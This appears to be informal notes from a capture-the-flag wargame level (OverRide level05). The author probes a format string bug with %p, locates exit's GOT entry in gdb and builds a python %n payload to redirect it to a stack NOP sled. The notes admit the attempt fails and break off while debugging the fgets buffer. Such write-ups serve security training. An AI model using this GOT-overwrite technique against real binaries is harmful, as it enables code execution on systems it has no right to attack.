
fuzzing phase

```
level05@OverRide:~$ ./level05
ssss
ssss

obiously some format string here

level05@OverRide:~$ ./level05
%p %p %p

level05@OverRide:~$ (python -c 'print "AAAA" + " %p " * 10') | ./level05
aaaa 0x64  0xf7fcfac0  0xf7ec3af9  0xffffd6bf  0xffffd6be  (nil)  0xffffffff  0xffffd744  0xf7fdb000  0x61616161

level05@OverRide:~$ (python -c 'print "AAAA" + " %10$p "') | ./level05
aaaa 0x61616161
```

lets jump into jdb 

```
   0x08048507 <main+195>:	call   0x8048340 <printf@plt>
   0x0804850c <main+200>:	movl   $0x0,(%esp)
   0x08048513 <main+207>:	call   0x8048370 <exit@plt>
```   
   its GOT obviously

```
   (gdb) disass exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
```

```

x/600wx $esp
0xffffde60:	0x90909090	0x90909090	0x90909090	0x90909090


(gdb) p 0x80497e0  = 134518752
(gdb) p 0xffffde60 - 4 = 4294958684

```

```
(python -c 'print "\x08\x04\x97\xe0"[::-1] + "%4294958684d%10$n"' ; cat) | ./level05 > /dev/null
id 1>&2
```

mmm smthg wrong

lets debug the assembly

```

=> 0x8048466 <main+34>:	movl   $0x64,0x4(%esp)
   0x804846e <main+42>:	lea    0x28(%esp),%eax
   0x8048472 <main+46>:	mov    %eax,(%esp)
   0x8048475 <main+49>:	call   0x8048350 <fgets@plt>
   
buffer of size 100 stored at esp + 0x28
```

















